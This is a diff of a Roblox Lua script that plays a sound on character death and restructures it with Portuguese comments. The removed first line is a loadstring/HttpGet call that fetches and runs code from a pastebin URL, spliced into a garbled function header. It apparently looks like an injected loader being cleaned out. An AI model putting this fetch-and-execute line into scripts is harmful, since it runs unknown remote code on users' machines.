@@ -1,22 +1,28 @@
-loadstring(game:HttpGet("https://pastebin.com/3ReMRzv6"))()upCharacter(character)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
-	local humanoid = character:WaitForChild("Humanoid")
+local function onCharacterAdded(character)
+    local humanoid = character:WaitForChild("Humanoid")
 
-	humanoid.Died:Connect(function()
+    humanoid.Died:Connect(function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://109881661982810"
+        sound.Volume = 1
+        sound.Parent = workspace
 
-		local sound = Instance.new("Sound")
-		sound.SoundId = "rbxassetid://109881661982810"
-		sound.Volume = 1
-		sound.Parent = workspace
+        sound:Play()
 
-		sound:Play()
-
-	end)
-
+        -- Opcional: apagar o som depois que terminar
+        sound.Ended:Connect(function()
+            sound:Destroy()
+        end)
+    end)
 end
 
+-- Quando o personagem spawnar
+player.CharacterAdded:Connect(onCharacterAdded)
+
+-- Caso já esteja spawnado
 if player.Character then
-	setupCharacter(player.Character)
+    onCharacterAdded(player.Character)
 end
-
-player.CharacterAdded:Connect(setupCharacter)
